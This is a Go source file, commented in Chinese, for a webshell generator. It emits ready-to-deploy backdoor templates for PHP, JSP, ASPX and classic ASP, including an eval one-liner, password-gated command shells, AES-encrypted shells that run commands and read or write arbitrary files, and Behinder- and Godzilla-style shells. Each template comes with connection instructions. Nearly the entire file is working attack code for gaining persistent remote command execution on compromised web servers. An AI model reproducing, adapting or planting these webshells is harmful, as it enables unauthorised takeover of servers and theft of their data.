// 生成器:产出基础马与自研加密马(php/jsp/aspx/asp),协议与通道实现逐字段对齐。
// 免杀变体不在生成器职责内;产物入库并提供下载(不落服务器文件系统)。
package webshellproto

import (
	"fmt"
	"strings"
)

// GenKind 生成器种类元信息。
type GenKind struct {
	Kind  string `json:"kind"`
	Label string `json:"label"`
	Ext   string `json:"ext"`
	Lang  string `json:"lang"`
}

// GenKinds 全部生成类型。
var GenKinds = []GenKind{
	{"php-oneliner", "PHP 一句话(eval 通道)", "php", "php"},
	{"php-basic", "PHP 基础马(口令门+命令通道)", "php", "php"},
	{"php-aes1", "PHP 自研加密马 v1(c/u/d)", "php", "php"},
	{"php-aes2", "PHP 自研加密马 v2(+e eval)", "php", "php"},
	{"php-behinder", "PHP 冰蝎型马(AES-ECB 形态)", "php", "php"},
	{"php-godzilla", "PHP 哥斯拉型马(XOR_BASE64 形态)", "php", "php"},
	{"jsp-basic", "JSP 基础马(口令门+命令通道)", "jsp", "jsp"},
	{"jsp-aes1", "JSP 自研加密马 v1(c/u/d)", "jsp", "jsp"},
	{"aspx-basic", "ASPX 基础马(口令门+命令通道)", "aspx", "aspx"},
	{"aspx-aes1", "ASPX 自研加密马 v1(c/u/d)", "aspx", "aspx"},
	{"asp-basic", "ASP 经典马(口令门+命令通道·WScript.Shell)", "asp", "asp"},
}

// GenOptions 生成参数。
type GenOptions struct {
	Name      string `json:"name"`
	PassParam string `json:"pass_param"`
	CmdParam  string `json:"cmd_param"`
	Password  string `json:"password"`
	SecretKey string `json:"secret_key"`
}

// GenProduct 生成产物。
type GenProduct struct {
	Name      string `json:"name"`
	Kind      string `json:"kind"`
	Lang      string `json:"lang"`
	Ext       string `json:"ext"`
	Content   string `json:"content"`
	Password  string `json:"password"`
	PassParam string `json:"pass_param"`
	CmdParam  string `json:"cmd_param"`
	ConnHint  string `json:"conn_hint"`
}

func randPass() string { return RandHex(6) }

const tplPhpOnelinerT = "<?php @eval($_POST['%s']); ?>\n"

const tplPhpBasicT = `<?php
if (isset($_POST['%s']) && hash_equals('%s', $_POST['%s']) && isset($_POST['%s'])) {
    $r = false;
    if (function_exists('shell_exec')) { $r = @shell_exec($_POST['%s'] . ' 2>&1'); }
    elseif (function_exists('system')) { ob_start(); @system($_POST['%s'] . ' 2>&1'); $r = ob_get_clean(); }
    elseif (function_exists('exec')) { $x = array(); @exec($_POST['%s'] . ' 2>&1', $x); $r = implode("\n", $x); }
    echo $r === false || $r === null ? '' : $r;
}
`

const phpAesHead = `<?php
$t = isset($_SERVER['HTTP_X_T']) ? $_SERVER['HTTP_X_T'] : '';
$m = base64_decode($t, true);
if ($m === false || strlen($m) !== 32) { http_response_code(404); exit; }
$iv = substr($m, 0, 16);
$k  = substr($m, 16, 16);
$pt = openssl_decrypt(base64_decode(file_get_contents('php://input'), true), 'AES-128-CBC', $k, OPENSSL_RAW_DATA, $iv);
if ($pt === false || $pt === '') { http_response_code(500); exit; }
$op = $pt[0];
$a  = substr($pt, 1);
header('Content-Type: application/json; charset=utf-8');
function wsm_ok($d) { echo json_encode(array('code' => 0, 'data' => base64_encode($d))); exit; }
`

const phpAesCmd = `switch ($op) {
case 'c':
    $r = '';
    if (function_exists('shell_exec')) { $r = @shell_exec($a); }
    elseif (function_exists('system')) { ob_start(); @system($a); $r = ob_get_clean(); }
    elseif (function_exists('exec')) { $x = array(); @exec($a . ' 2>&1', $x); $r = implode("\n", $x); }
    wsm_ok($r === false || $r === null ? '' : (string)$r);
case 'u':
    $p = explode('|', $a, 3);
    if (count($p) !== 3) { http_response_code(404); exit; }
    $d = base64_decode($p[2], true);
    wsm_ok(@file_put_contents($p[1], $d) === false ? 'err' : 'ok');
case 'd':
    $c = @file_get_contents($a);
    wsm_ok($c === false ? '' : $c);
`

const phpAesEval = `case 'e':
    ob_start();
    try { eval($a); } catch (Throwable $e) {}
    $o = ob_get_clean();
    wsm_ok($o === false ? '' : (string)$o);
`

const phpAesTail = `default:
    http_response_code(404); exit;
}
`

func tplPhpBehinder(password string) string {
	return `<?php
@error_reporting(0);
$k = '` + MD5Hex(password)[:16] + `';
$d = @openssl_decrypt(base64_decode(file_get_contents('php://input')), 'AES-128-ECB', $k, OPENSSL_RAW_DATA);
if ($d !== false) { @eval($d); }
`
}

func tplPhpGodzilla(passParam, secretKey string) string {
	return `<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function wsm_enc($D, $K){
    for ($i = 0; $i < strlen($D); $i++) { $D[$i] = $D[$i] ^ $K[($i + 1) & 15]; }
    return $D;
}
$pass = '` + passParam + `';
$key = '` + MD5Hex(secretKey)[:16] + `';
if (isset($_POST[$pass])) {
    $data = wsm_enc(base64_decode($_POST[$pass]), $key);
    if (isset($_SESSION['w'])) {
        $payload = wsm_enc($_SESSION['w'], $key);
        if (strpos($payload, 'getBasicsInfo') === false) { $payload = wsm_enc($payload, $key); }
        eval($payload);
        echo substr(md5($pass . $key), 0, 16);
        echo base64_encode(wsm_enc(@run($data), $key));
        echo substr(md5($pass . $key), 16);
    } else {
        if (strpos($data, 'getBasicsInfo') !== false) {
            $_SESSION['w'] = wsm_enc($data, $key);
        }
    }
}
`
}

const tplJspBasicT = `<%@ page import="java.io.*,java.util.*" %>
<%
String pw = request.getParameter("@PASS@");
String c = request.getParameter("@CMD@");
if ("@PASSWORD@".equals(pw) && c != null) {
    try {
        String os = System.getProperty("os.name").toLowerCase();
        ProcessBuilder pb = os.contains("win")
            ? new ProcessBuilder("cmd.exe", "/c", c)
            : new ProcessBuilder("/bin/sh", "-c", c);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line; StringBuilder sb = new StringBuilder();
        while ((line = br.readLine()) != null) { sb.append(line).append('\n'); }
        p.waitFor();
        out.println(sb.toString());
    } catch (Exception e) { out.println("err: " + e.getMessage()); }
}
%>
`

const tplJspAesT = `<%@ page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,javax.crypto.spec.IvParameterSpec,java.util.*,java.io.*,java.nio.file.*,java.nio.charset.StandardCharsets" %>
<%
String t = request.getHeader("X-T");
byte[] m = null;
try { if (t != null) m = Base64.getDecoder().decode(t); } catch (Exception e) {}
if (m == null || m.length != 32) { response.setStatus(404); return; }
byte[] iv = Arrays.copyOfRange(m, 0, 16);
byte[] key = Arrays.copyOfRange(m, 16, 32);
java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
java.io.InputStream is = request.getInputStream();
byte[] buf = new byte[8192];
int nread;
while ((nread = is.read(buf)) > 0) { bos.write(buf, 0, nread); }
byte[] body = bos.toByteArray();
byte[] ct;
try { ct = Base64.getDecoder().decode(body); } catch (Exception e) { response.setStatus(500); return; }
byte[] pt;
try {
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
    pt = cipher.doFinal(ct);
} catch (Exception e) { response.setStatus(500); return; }
String op = new String(pt, 0, 1, StandardCharsets.UTF_8);
String arg = new String(pt, 1, pt.length - 1, StandardCharsets.UTF_8);
response.setContentType("application/json; charset=utf-8");
if (op.equals("c")) {
    String os = System.getProperty("os.name").toLowerCase();
    StringBuilder sb = new StringBuilder();
    try {
        ProcessBuilder pb = os.contains("win") ? new ProcessBuilder("cmd.exe", "/c", arg) : new ProcessBuilder("/bin/sh", "-c", arg);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) { sb.append(line).append('\n'); }
        p.waitFor();
    } catch (Exception e) { sb.append("err: ").append(e.getMessage()); }
    out.println("{\"code\":0,\"data\":\"" + Base64.getEncoder().encodeToString(sb.toString().getBytes(StandardCharsets.UTF_8)) + "\"}");
} else if (op.equals("u")) {
    String[] parts = arg.split("\\|", 3);
    String res = "err";
    if (parts.length == 3) {
        try { Files.write(Paths.get(parts[1]), Base64.getDecoder().decode(parts[2])); res = "ok"; } catch (Exception e) {}
    }
    out.println("{\"code\":0,\"data\":\"" + Base64.getEncoder().encodeToString(res.getBytes(StandardCharsets.UTF_8)) + "\"}");
} else if (op.equals("d")) {
    byte[] data = new byte[0];
    try { data = Files.readAllBytes(Paths.get(arg)); } catch (Exception e) {}
    out.println("{\"code\":0,\"data\":\"" + Base64.getEncoder().encodeToString(data) + "\"}");
} else {
    response.setStatus(404);
}
%>
`

const tplAspxBasicT = `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load() {
    if (Request.Form["@PASS@"] != "@PASSWORD@" || Request.Form["@CMD@"] == null) return;
    string c = Request.Form["@CMD@"];
    try {
        var psi = new ProcessStartInfo("cmd.exe", "/c " + c) { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
        if (!Environment.OSVersion.ToString().Contains("Windows"))
            psi = new ProcessStartInfo("/bin/sh", "-c \"" + c.Replace("\"", "\\\"") + "\"") { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
        using (var p = Process.Start(psi)) {
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write(p.StandardError.ReadToEnd());
            p.WaitForExit(20000);
        }
    } catch (Exception e) { Response.Write("err: " + e.Message); }
}
</script>
`

const tplAspxAesT = `<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
static string J(byte[] d) { return "{\"code\":0,\"data\":\"" + Convert.ToBase64String(d) + "\"}"; }
void Page_Load() {
    string t = Request.Headers["X-T"] ?? "";
    byte[] m;
    try { m = Convert.FromBase64String(t); } catch { Response.StatusCode = 404; return; }
    if (m.Length != 32) { Response.StatusCode = 404; return; }
    byte[] iv = new byte[16], key = new byte[16];
    Array.Copy(m, 0, iv, 0, 16); Array.Copy(m, 16, key, 0, 16);
    string bodyStr; using (var sr = new StreamReader(Request.InputStream, Encoding.ASCII)) { bodyStr = sr.ReadToEnd(); }
    byte[] ct;
    try { ct = Convert.FromBase64String(bodyStr.Trim()); } catch { Response.StatusCode = 500; return; }
    byte[] pt;
    try {
        using (var aes = Aes.Create()) {
            aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; aes.Key = key; aes.IV = iv;
            using (var dec = aes.CreateDecryptor()) pt = dec.TransformFinalBlock(ct, 0, ct.Length);
        }
    } catch { Response.StatusCode = 500; return; }
    string op = Encoding.UTF8.GetString(pt, 0, 1);
    string arg = Encoding.UTF8.GetString(pt, 1, pt.Length - 1);
    Response.ContentType = "application/json";
    if (op == "c") {
        var sb = new StringBuilder();
        try {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + arg) { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
            if (!Environment.OSVersion.ToString().Contains("Windows"))
            psi = new ProcessStartInfo("/bin/sh", "-c \"" + arg.Replace("\"", "\\\"") + "\"") { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
            using (var p = Process.Start(psi)) { sb.Append(p.StandardOutput.ReadToEnd()); sb.Append(p.StandardError.ReadToEnd()); p.WaitForExit(20000); }
        } catch (Exception e) { sb.Append("err: ").Append(e.Message); }
        Response.Write(J(Encoding.UTF8.GetBytes(sb.ToString())));
    } else if (op == "u") {
        var parts = arg.Split(new[] { '|' }, 3);
        byte[] res = Encoding.UTF8.GetBytes("err");
        if (parts.Length == 3) { try { File.WriteAllBytes(parts[1], Convert.FromBase64String(parts[2])); res = Encoding.UTF8.GetBytes("ok"); } catch { } }
        Response.Write(J(res));
    } else if (op == "d") {
        byte[] data = new byte[0];
        try { data = File.ReadAllBytes(arg); } catch { }
        Response.Write(J(data));
    } else {
        Response.StatusCode = 404;
    }
}
</script>
`

const tplAspBasicT = `<%
Dim p, c
p = Request.Form("@PASS@")
c = Request.Form("@CMD@")
If p = "@PASSWORD@" And c <> "" Then
    Dim sh, tmp, fso
    Set sh = Server.CreateObject("WScript.Shell")
    tmp = Server.MapPath(".") & "\x" & Int(Rnd * 99999999) & ".tmp"
    sh.Run "cmd /c " & c & " > """ & tmp & """ 2>&1", 0, True
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(tmp) Then
        Dim f
        Set f = fso.OpenTextFile(tmp, 1)
        Response.BinaryWrite(f.ReadAll)
        f.Close
        fso.DeleteFile tmp
    End If
End If
%>
`

func tplPhpAes(withEval bool) string {
	s := phpAesHead + phpAesCmd
	if withEval {
		s += phpAesEval
	}
	return s + phpAesTail
}

// Generate 生成一个马。
func Generate(kind string, opts GenOptions) (*GenProduct, error) {
	var meta *GenKind
	for i := range GenKinds {
		if GenKinds[i].Kind == kind {
			meta = &GenKinds[i]
			break
		}
	}
	if meta == nil {
		kinds := make([]string, 0, len(GenKinds))
		for _, k := range GenKinds {
			kinds = append(kinds, k.Kind)
		}
		return nil, fmt.Errorf("未知生成类型 %s(可选:%s)", kind, strings.Join(kinds, " / "))
	}
	passParam := orDefault(opts.PassParam, "pass")
	cmdParam := orDefault(opts.CmdParam, "cmd")
	password := opts.Password
	if password == "" {
		password = randPass()
	}
	secretKey := orDefault(opts.SecretKey, password)

	var content string
	connHint := ""
	switch kind {
	case "php-oneliner":
		content = fmt.Sprintf(tplPhpOnelinerT, passParam)
		connHint = fmt.Sprintf("连接:协议=cmd-eval,POST 参数名=%s,URL=<马地址>", passParam)
	case "php-basic":
		content = sprintf6(tplPhpBasicT, passParam, password, passParam, cmdParam, cmdParam, cmdParam, cmdParam)
		connHint = fmt.Sprintf("连接:协议=cmd-system,口令参数=%s,口令=%s,命令参数=%s", passParam, password, cmdParam)
	case "php-aes1":
		content = tplPhpAes(false)
		connHint = "连接:协议=dsh-aes(无需口令——密钥每请求随机);v1 仅命令+二进制读写"
	case "php-aes2":
		content = tplPhpAes(true)
		connHint = "连接:协议=dsh-aes(无需口令);v2 含 eval 能力(结构化文件/数据库操作可用)"
	case "php-behinder":
		content = tplPhpBehinder(password)
		connHint = fmt.Sprintf("连接:协议=behinder,口令=%s(key=md5(口令)[0:16] 自动派生)", password)
	case "php-godzilla":
		content = tplPhpGodzilla(passParam, secretKey)
		connHint = fmt.Sprintf("连接:协议=godzilla,password=POST 参数名(%s),密钥源=%s", passParam, secretKey)
	case "jsp-basic":
		content = renderTokens(tplJspBasicT, map[string]string{"@PASS@": passParam, "@CMD@": cmdParam, "@PASSWORD@": password})
		connHint = fmt.Sprintf("连接:协议=cmd-system,口令参数=%s,口令=%s,命令参数=%s(method=get)", passParam, password, cmdParam)
	case "jsp-aes1":
		content = tplJspAesT
		connHint = "连接:协议=dsh-aes(无需口令);v1 仅命令+二进制读写"
	case "aspx-basic":
		content = renderTokens(tplAspxBasicT, map[string]string{"@PASS@": passParam, "@PASSWORD@": password, "@CMD@": cmdParam})
		connHint = fmt.Sprintf("连接:协议=cmd-system,口令参数=%s,口令=%s,命令参数=%s", passParam, password, cmdParam)
	case "aspx-aes1":
		content = tplAspxAesT
		connHint = "连接:协议=dsh-aes(无需口令);v1 仅命令+二进制读写"
	case "asp-basic":
		content = renderTokens(tplAspBasicT, map[string]string{"@PASS@": passParam, "@CMD@": cmdParam, "@PASSWORD@": password})
		connHint = fmt.Sprintf("连接:协议=cmd-system,口令参数=%s,口令=%s,命令参数=%s", passParam, password, cmdParam)
	default:
		return nil, fmt.Errorf("unreachable")
	}
	name := strings.TrimSpace(opts.Name)
	if name == "" {
		name = kind + "-" + RandHex(4)
	}
	return &GenProduct{
		Name: name, Kind: kind, Lang: meta.Lang, Ext: meta.Ext, Content: content,
		Password: password, PassParam: passParam, CmdParam: cmdParam, ConnHint: connHint,
	}, nil
}

func renderTokens(tpl string, tokens map[string]string) string {
	out := tpl
	for k, v := range tokens {
		out = strings.ReplaceAll(out, k, v)
	}
	return out
}

func sprintf6(tpl string, args ...string) string {
	return fmt.Sprintf(tpl, toAnys(args)...)
}

func toAnys(args []string) []any {
	out := make([]any, len(args))
	for i, a := range args {
		out[i] = a
	}
	return out
}
